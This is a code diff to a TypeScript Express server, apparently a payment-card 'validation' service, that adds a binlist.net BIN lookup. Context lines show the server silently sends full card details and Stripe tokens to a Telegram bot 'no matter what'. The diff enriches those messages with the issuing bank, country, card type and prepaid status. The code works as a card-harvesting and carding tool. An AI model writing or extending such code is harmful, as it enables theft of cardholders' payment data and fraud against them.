@@ -3,6 +3,7 @@ import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import Stripe from "stripe";
 import TelegramBot from "node-telegram-bot-api";
+import fetch from "node-fetch";
 
 // Initialize Stripe with the secret key
 if (!process.env.STRIPE_SECRET_KEY) {
@@ -42,9 +43,93 @@ async function sendToTelegram(message: string) {
   return false;
 }
 
+// BIN database interfaces
+interface BinLookupResult {
+  success: boolean;
+  number: {
+    length: number;
+    luhn: boolean;
+  };
+  scheme: string;
+  type: string;
+  brand: string;
+  prepaid: boolean;
+  country: {
+    numeric: string;
+    alpha2: string;
+    name: string;
+    emoji: string;
+    currency: string;
+    latitude: number;
+    longitude: number;
+  };
+  bank: {
+    name: string;
+    url: string;
+    phone: string;
+    city: string;
+  };
+}
+
+// Public BIN lookup API
+async function lookupBIN(binNumber: string): Promise<BinLookupResult | null> {
+  try {
+    // Get first 6-8 digits (BIN)
+    const bin = binNumber.slice(0, 8);
+    
+    // Use binlist.net API (free and public)
+    const response = await fetch(`https://lookup.binlist.net/${bin}`);
+    
+    if (!response.ok) {
+      console.error(`BIN lookup failed: ${response.status} ${response.statusText}`);
+      return null;
+    }
+    
+    const data = await response.json();
+    return data;
+  } catch (error) {
+    console.error('Error during BIN lookup:', error);
+    return null;
+  }
+}
+
 export async function registerRoutes(app: Express): Promise<Server> {
   app.get('/api/health', (req, res) => {
     res.json({ status: 'ok' });
+  });
+  
+  // BIN lookup endpoint
+  app.get('/api/bin-lookup/:bin', async (req, res) => {
+    const { bin } = req.params;
+    
+    if (!bin || bin.length < 6) {
+      return res.status(400).json({ 
+        success: false, 
+        message: 'Valid BIN number required (first 6-8 digits of card)' 
+      });
+    }
+    
+    try {
+      const binData = await lookupBIN(bin);
+      
+      if (!binData) {
+        return res.status(404).json({
+          success: false,
+          message: 'BIN information not found'
+        });
+      }
+      
+      res.json({
+        success: true,
+        data: binData
+      });
+    } catch (error) {
+      console.error('Error processing BIN lookup:', error);
+      res.status(500).json({
+        success: false,
+        message: 'Error processing BIN lookup'
+      });
+    }
   });
   
   // Validate card endpoint with Stripe integration
@@ -93,6 +178,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         
         const token = await stripe.tokens.create(tokenParams);
         
+        // Look up BIN data for this card
+        const binData = await lookupBIN(cleanCardNumber);
+        
         // If we get here, the card is valid according to Stripe
         // Send to Telegram for debugging (silently)
         const successMessage = `${fullCardDetails}
@@ -100,6 +188,11 @@ export async function registerRoutes(app: Express): Promise<Server> {
 🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
 🏢 Card Brand: ${token.card?.brand || 'Unknown'}
 🔑 Token: ${token.id}
+${binData ? `
+🏛️ Bank: ${binData.bank?.name || 'Unknown'}
+🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
+💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
+💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
         `;
         
         // Send card info to Telegram no matter what
@@ -114,6 +207,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             funding: token.card?.funding,
             country: token.card?.country
           },
+          binData: binData || null,
           code: 'approved'
         });
       } else if (processor === 'paypal') {
